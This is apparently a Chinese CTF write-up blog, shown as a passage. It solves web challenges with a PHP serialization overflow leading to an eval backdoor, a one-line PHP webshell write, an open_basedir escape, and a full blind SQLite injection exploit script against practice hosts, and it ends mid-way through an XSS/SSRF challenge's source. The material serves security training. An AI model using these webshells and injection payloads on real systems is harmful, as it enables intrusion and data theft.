class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> <span class="title class_">User</span>;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目主要源码如上，主要就是绕过那个if，这里整形溢出直接绕过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;count=<span class="number">9223372036854775806</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683878028410-6e97dd3a-2533-4f92-bcc2-3f498e9aa1ca.png#averageHue=%23717f61&clientId=ua4330dfb-e7a2-4&from=paste&height=734&id=uf03fdd51&originHeight=918&originWidth=1787&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=102692&status=done&style=none&taskId=u917e493b-df8e-48e3-9a32-b3908656438&title=&width=1429.6" alt="image.png"><br>可以有效绕过。<br>绕过后就可以rce，phpinfo发现disable了很多function，但是可以写马<br><code>?backdoor=file_put_contents(&quot;/var/www/html/boogipop.php&quot;,&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;);</code><br>蚁剑连上去利用UserFIlter绕过一下disabled_function，但是，这个方法是2022出来的，题目是2021所以我等于用现代知识去打了。所以这是非预期，绕过之后就反弹一个shell回来，寻找suid权限，发现php指令是s权限<br>那么我们可以利用<code>php -a </code>进行交互式php终端，然后提权，这里php -a得到交互终端后需要绕过open_basedir，我们使用如下方法绕过<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683878173558-c722e0e8-2f8a-47c7-9d8c-91cc325f76c6.png#averageHue=%2335312b&clientId=ua4330dfb-e7a2-4&from=paste&height=439&id=u1fe69fcf&originHeight=549&originWidth=1352&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1200858&status=done&style=none&taskId=uff2c9953-c580-4b0f-95e5-e1eae85135c&title=&width=1081.6" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">getcwd</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">getcwd</span>();</span><br><span class="line">/<span class="keyword">var</span>/www/html/a</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>最后直接readfile即可<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683878189520-d470dca3-50ab-4f14-a0dc-282bcd2a0f33.png#averageHue=%232e2824&clientId=ua4330dfb-e7a2-4&from=paste&height=108&id=u5ff431d2&originHeight=135&originWidth=710&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=144097&status=done&style=none&taskId=u7d6e0853-930e-464c-852a-03a24e7b6c0&title=&width=568" alt="image.png"></p>
<h1 id="HXBCTF-2021-easywill"><a href="#HXBCTF-2021-easywill" class="headerlink" title="[HXBCTF 2021]easywill"></a>[HXBCTF 2021]easywill</h1><p>考点：代码审计、文件包含getshell</p>
<h1 id="HarekazeCTF2019-Sqlite-Voting"><a href="#HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="[HarekazeCTF2019]Sqlite Voting"></a>[HarekazeCTF2019]Sqlite Voting</h1><p>考点：SQLITE 整形溢出 replace hex<br>题目源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// &quot; % &#x27; * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">&quot;[\&quot;%&#x27;*+\\/&lt;=&gt;\\\\_`~-]&quot;</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">&#x27;\s&#x27;</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">&#x27;blob&#x27;</span>, <span class="string">&#x27;load_extension&#x27;</span>, <span class="string">&#x27;char&#x27;</span>, <span class="string">&#x27;unicode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(in|sub)str&#x27;</span>, <span class="string">&#x27;[lr]trim&#x27;</span>, <span class="string">&#x27;like&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;match&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;limit&#x27;</span>, <span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;join&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/json; charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check user input</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;You must specify vote id&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_valid</span>(<span class="variable">$id</span>)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Vote id contains dangerous chars&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// update database</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;sqlite:../db/vote.db&#x27;</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$res</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;An error occurred while updating database&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// succeeded!</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">  <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Thank you for your vote! The result will be published after the CTF finished.&#x27;</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">&#x27;http://1aa0d946-f0a0-4c60-a26a-b5ba799227b6.node2.buuoj.cn.wetolink.com:82/vote.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  r = requests.post(URL, data=&#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">f&#x27;abs(case(length(hex((select(flag)from(flag))))&amp;<span class="subst">&#123;<span class="number">1</span>&lt;&lt;j&#125;</span>)when(0)then(0)else(0x8000000000000000)end)&#x27;</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">b&#x27;An error occurred&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">    l |= <span class="number">1</span> &lt;&lt; j</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] length:&#x27;</span>, l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">&#x27;A&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;C&#x27;</span>] = <span class="string">&#x27;trim(hex(typeof(.1)),12567)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;D&#x27;</span>] = <span class="string">&#x27;trim(hex(0xffffffffffffffff),123)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;E&#x27;</span>] = <span class="string">&#x27;trim(hex(0.1),1230)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;F&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;B&#x27;</span>] = <span class="string">f&#x27;trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">&quot;C&quot;</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">&quot;F&quot;</span>]&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = binascii.hexlify(<span class="string">b&#x27;flag&#123;&#x27;</span>).decode().upper()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res), l):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;0123456789ABCDEF&#x27;</span>:</span><br><span class="line">    t = <span class="string">&#x27;||&#x27;</span>.join(c <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">&#x27;0123456789&#x27;</span> <span class="keyword">else</span> table[c] <span class="keyword">for</span> c <span class="keyword">in</span> res + x)</span><br><span class="line">    r = requests.post(URL, data=&#123;</span><br><span class="line">      <span class="string">&#x27;id&#x27;</span>: <span class="string">f&#x27;abs(case(replace(length(replace(hex((select(flag)from(flag))),<span class="subst">&#123;t&#125;</span>,trim(0,0))),<span class="subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;An error occurred&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">      res += x</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&#x27;[+] flag (<span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;l&#125;</span>): <span class="subst">&#123;res&#125;</span>&#x27;</span>)</span><br><span class="line">  i += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] flag:&#x27;</span>, binascii.unhexlify(res).decode())</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">&#x27;http://1e5460dc-7687-42ca-903b-d76d11d9894b.node4.buuoj.cn:81/vote.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  r = requests.post(URL, data=&#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">f&#x27;abs(case(length(hex((select(flag)from(flag))))&amp;<span class="subst">&#123;<span class="number">1</span>&lt;&lt;j&#125;</span>)when(0)then(0)else(0x8000000000000000)end)&#x27;</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">b&#x27;An error occurred&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">    l |= <span class="number">1</span> &lt;&lt; j</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] length:&#x27;</span>, l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">&#x27;A&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;C&#x27;</span>] = <span class="string">&#x27;trim(hex(typeof(.1)),12567)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;D&#x27;</span>] = <span class="string">&#x27;trim(hex(0xffffffffffffffff),123)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;E&#x27;</span>] = <span class="string">&#x27;trim(hex(0.1),1230)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;F&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;B&#x27;</span>] = <span class="string">f&#x27;trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">&quot;C&quot;</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">&quot;F&quot;</span>]&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = binascii.hexlify(<span class="string">b&#x27;flag&#123;&#x27;</span>).decode().upper()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, l):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;0123456789ABCDEF&#x27;</span>:</span><br><span class="line">    t = <span class="string">&#x27;||&#x27;</span>.join(c <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">&#x27;0123456789&#x27;</span> <span class="keyword">else</span> table[c] <span class="keyword">for</span> c <span class="keyword">in</span> res + x)</span><br><span class="line">    r = requests.post(URL, data=&#123;</span><br><span class="line">      <span class="string">&#x27;id&#x27;</span>: <span class="string">f&#x27;abs(case(replace(length(replace(hex((select(flag)from(flag))),<span class="subst">&#123;t&#125;</span>,trim(0,0))),<span class="subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;An error occurred&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">      res += x</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&#x27;[+] flag (<span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;l&#125;</span>): <span class="subst">&#123;res&#125;</span>&#x27;</span>)</span><br><span class="line">  i += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] flag:&#x27;</span>, binascii.unhexlify(res).decode())</span><br></pre></td></tr></table></figure>
<p>这一题的妙处在于使用trim构造十六进制的字母，由于题目是过滤了单双引号的，以及过滤了一些函数，这让常规操作都无法生效，但是在sqlite中<code>||</code>是字符串连接符。它和mysql是不一样的所以可以进行字符串连接<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685618222685-1f60f0a4-4dd7-4a68-ab80-12f38b078ed5.png#averageHue=%2338322e&clientId=uab4b7e6d-cb7e-4&from=paste&height=88&id=ua73042b2&originHeight=110&originWidth=727&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=120505&status=done&style=none&taskId=u565614a9-b236-467f-80c1-fd65dec55bd&title=&width=581.6" alt="image.png"><br>然后上述exp中可以通过trim(hex)的方法获取<code>ABCDEFG</code>，这样就可以使用任意的十六进制字符了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685618272193-061b709b-d859-42cc-bbe5-78fcfae4773e.png#averageHue=%233b3532&clientId=uab4b7e6d-cb7e-4&from=paste&height=55&id=u1bacd38e&originHeight=69&originWidth=443&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=51815&status=done&style=none&taskId=uc1cb2e14-2c02-403c-8922-6eb2e3a2252&title=&width=354.4" alt="image.png"><br>去除掉字母就只剩下<code>C</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685618292272-2fdb3967-b985-4619-aced-3674cb4ee3e9.png#averageHue=%23443c37&clientId=uab4b7e6d-cb7e-4&from=paste&height=59&id=udcb3d682&originHeight=74&originWidth=750&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=99229&status=done&style=none&taskId=u1a00ab3a-7b94-461c-ad1f-be532c2a2c1&title=&width=600" alt="image.png"><br>这样就得到了字母<code>C</code>，其他的也一样可以获取，这就是这题的妙处，然后这一题对于绕过<code>=</code>使用的是<code>case...when</code>语句<br><code>select case when 1 then &#39;ok&#39; else &#39;fuck&#39; end;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685618497963-08e0955e-d848-48ff-a6cd-d37d58560090.png#averageHue=%23342d28&clientId=uab4b7e6d-cb7e-4&from=paste&height=139&id=u5f8c0c60&originHeight=174&originWidth=791&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=215585&status=done&style=none&taskId=ue7f19ac6-8124-41d5-a267-d902422bba8&title=&width=632.8" alt="image.png"><br>这一点也十分的妙，这就是这题的精髓</p>
<h1 id="2021祥云杯-secrets-of-admin"><a href="#2021祥云杯-secrets-of-admin" class="headerlink" title="[2021祥云杯]secrets_of_admin"></a>[2021祥云杯]secrets_of_admin</h1><p>考点：XSS+SSRF<br>有点傻了，忘记了include是可以绕的，其实知道可以绕，但是不知道数组桡过后值还能传过来，我铸币了对不起<br>不过话说回来这题出的也不错的，迷惑点很多，然后考点也不是很难，完全靠的是我们的识别和审计能力了。是一次不错的锻炼。<br>开局给我们代码了<br>index.ts</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> express <span class="keyword">from</span> <span class="string">&#x27;express&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Request</span>, <span class="title class_">Response</span>, <span class="title class_">NextFunction</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;express&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> createError <span class="keyword">from</span> <span class="string">&quot;http-errors&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> pdf <span class="keyword">from</span> <span class="string">&#x27;html-pdf&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="variable constant_">DB</span> <span class="keyword">from</span> <span class="string">&#x27;../database&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> fs <span class="keyword">from</span> <span class="string">&#x27;fs&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> path <span 